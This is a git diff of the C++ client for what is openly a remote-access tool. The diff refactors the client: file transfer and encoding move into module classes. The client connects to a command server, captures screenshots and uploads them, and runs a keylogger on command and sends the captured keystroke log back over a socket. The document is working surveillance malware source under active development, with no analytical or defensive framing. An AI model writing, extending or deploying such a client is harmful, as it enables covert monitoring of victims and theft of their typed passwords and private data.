@@ -1,5 +1,4 @@
-// g++ -std=c++11 client.cpp .\modules\ss_module.cpp -o client -lws2_32 -lgdiplus -lgdi32 -lole32 -pthread OLD VERSION WITHOUT KEYLOGGER DELETE IF YOU WANT
-//g++ client.cpp .\modules\ss_module.cpp .\modules\keylogger\keylogger_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
+//g++ client.cpp .\modules\module.cpp .\modules\ss_module.cpp .\modules\keylogger\keylogger_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
 
 // TO DO
 // move functions to the modules directory and minimize client.cpp
@@ -46,16 +45,27 @@ const int    RECV_BUF_SIZE = 1024;        // Buffer size for receiving data
 // Global atomic flag for graceful shutdown
 std::atomic<bool> g_running{true};
 
-// Function declarations
-std::string base64_encode(const std::vector<char>& data);
-bool send_message(SOCKET sock, const std::string& message);
-bool SendFileViaMsgpack(SOCKET sock, const char* filename);
-bool SendFileInChunks(SOCKET sock, const char* filename, const std::vector<char>& filedata);
+//Function declarations
+//Bu ikisinin burda olması optimal değil aynı fonksiyonlar hem module hem burda var ama üzerine şuan çok düşünmedim daha iyi yazılabilir.
+bool send_message(SOCKET sock, const std::string& msg);
+std::vector<char> create_message(const std::string& content);
 
 //Module declarations
 Keylogger_Module keylogger;
+SS_Module screenshot;
 
-// Simple msgpack message structure for server compatibility
+
+// Signal handler to catch termination signals (like Ctrl+C)
+void signal_handler(int signal) {
+    std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
+    g_running = false; // Set the flag to false to stop main loop
+}
+
+bool send_message(SOCKET sock, const std::string& msg){
+    std::vector<char> formatted_msg = create_message(msg);
+    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
+}
+
 std::vector<char> create_message(const std::string& content) {
     // Create msgpack format: [{"content": "message"}]
     // This is a simplified approach that works with the Python server
@@ -93,108 +103,6 @@ std::vector<char> create_message(const std::string& content) {
     return result;
 }
 
-// Signal handler to catch termination signals (like Ctrl+C)
-void signal_handler(int signal) {
-    std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
-    g_running = false; // Set the flag to false to stop main loop
-}
-
-// TODO: Implement this function to base module class to prevent writing the same code over and over.
-// Function to send a file over socket using msgpack protocol
-bool SendFileViaMsgpack(SOCKET sock, const char* filename) {
-    // Open file in binary mode
-    std::ifstream file(filename, std::ios::binary);
-    if (!file.is_open()) {
-        std::cerr << "Failed to open file: " << filename << std::endl;
-        return false;
-    }
-
-    // Read entire file into memory
-    file.seekg(0, std::ios::end);
-    size_t filesize = file.tellg();
-    file.seekg(0, std::ios::beg);
-    
-    std::vector<char> filedata(filesize);
-    file.read(filedata.data(), filesize);
-    file.close();
-    
-    // For large files, we should chunk them
-    if (filesize > 64 * 1024) { // 64KB limit for single message
-        std::cout << "[Info] Large file (" << filesize << " bytes) - using chunked transfer" << std::endl;
-        return SendFileInChunks(sock, filename, filedata);
-    }
-    
-    // Convert binary data to base64 for safe transmission
-    std::string base64_data = base64_encode(filedata);
-    
-    // Send file as a single message
-    std::string file_message = "SCREENSHOT_DATA:" + base64_data;
-    return send_message(sock, file_message);
-}
-
-// Function to send file in chunks for large files
-bool SendFileInChunks(SOCKET sock, const char* filename, const std::vector<char>& filedata) {
-    const size_t chunk_size = 512; // 512 bytes chunks to stay well under msgpack 1024 limit
-    size_t total_chunks = (filedata.size() + chunk_size - 1) / chunk_size;
-    
-    std::cout << "[Info] Sending file in " << total_chunks << " chunks of " << chunk_size << " bytes each" << std::endl;
-    
-    // Send file header
-    std::string header = "FILE_START:" + std::string(filename) + ":" + std::to_string(filedata.size()) + ":" + std::to_string(total_chunks);
-    if (!send_message(sock, header)) return false;
-    
-    // Send chunks
-    for (size_t i = 0; i < total_chunks; ++i) {
-        size_t start = i * chunk_size;
-        size_t end = std::min(start + chunk_size, filedata.size());
-        
-        std::vector<char> chunk(filedata.begin() + start, filedata.begin() + end);
-        std::string base64_chunk = base64_encode(chunk);
-        
-        std::string chunk_message = "FILE_CHUNK:" + std::to_string(i) + ":" + base64_chunk;
-        if (!send_message(sock, chunk_message)) {
-            std::cerr << "[Error] Failed to send chunk " << i << "/" << total_chunks << std::endl;
-            return false;
-        }
-        
-        // Show progress every 50 chunks
-        if (i % 50 == 0 || i == total_chunks - 1) {
-            std::cout << "[Progress] Sent chunk " << (i + 1) << "/" << total_chunks << std::endl;
-        }
-        
-        // Small delay between chunks to avoid overwhelming the connection
-        std::this_thread::sleep_for(std::chrono::milliseconds(10));
-    }
-    
-    std::cout << "[Success] File transfer completed - " << total_chunks << " chunks sent" << std::endl;
-    
-    // Send file end marker
-    std::string end_message = "FILE_END:" + std::string(filename);
-    return send_message(sock, end_message);
-}
-
-// Simple base64 encoding function
-std::string base64_encode(const std::vector<char>& data) {
-    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    std::string result;
-    int val = 0, valb = -6;
-    
-    for (char c : data) {
-        val = (val << 8) + (unsigned char)c;
-        valb += 8;
-        while (valb >= 0) {
-            result.push_back(chars[(val >> valb) & 0x3F]);
-            valb -= 6;
-        }
-    }
-    if (valb > -6) {
-        result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
-    }
-    while (result.size() % 4) {
-        result.push_back('=');
-    }
-    return result;
-}
 
 // Initialize socket subsystem
 bool init_sockets() {
@@ -240,12 +148,6 @@ SOCKET connect_to_server(const char* ip, uint16_t port) {
     return sock; // Return connected socket
 }
 
-// Send message over socket using server's expected format
-bool send_message(SOCKET sock, const std::string& msg) {
-    std::vector<char> formatted_msg = create_message(msg);
-    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
-}
-
 // Receive message from socket
 int receive_reply(SOCKET sock, char* buffer, int bufSize) {
     int bytes = recv(sock, buffer, bufSize - 1, 0);
@@ -276,7 +178,7 @@ void handle_command(const std::string& command, SOCKET sock) {
             
             std::cout << "[Action] Screenshot taken, file saved as: " << filename << std::endl;
             
-            if (SendFileViaMsgpack(sock, filename)) {
+            if (screenshot.sendFileViaMsgPack(sock, filename)) {
                 std::cout << "[Success] Screenshot sent to server" << std::endl;
             } else {
                 std::cout << "[Warning] Screenshot saved locally but failed to send" << std::endl;
@@ -289,7 +191,7 @@ void handle_command(const std::string& command, SOCKET sock) {
     }
     else if (command == "START_KEYLOGGER") {
         std::cout << "[Action] Starting keylogger module..." << std::endl;
-        // TODO: Implement keylogger start
+        
         try{
             keylogger.run();
         }
@@ -300,9 +202,9 @@ void handle_command(const std::string& command, SOCKET sock) {
     }
     else if (command == "STOP_KEYLOGGER") {
         std::cout << "[Action] Stopping keylogger..." << std::endl;
-        // TODO: Implement keylogger stop
+        
         keylogger.stopKeylogger();
-        std::string& keylogFileName = keylogger.getKeylogFileName();
+        const char* keylogFileName = keylogger.getKeylogFileName();
         std::cout << "[Action] Keylogger stopped. File saved as: " << keylogFileName << std::endl;
 
         if (keylogger.sendFileViaMsgPack(sock, keylogFileName)) {
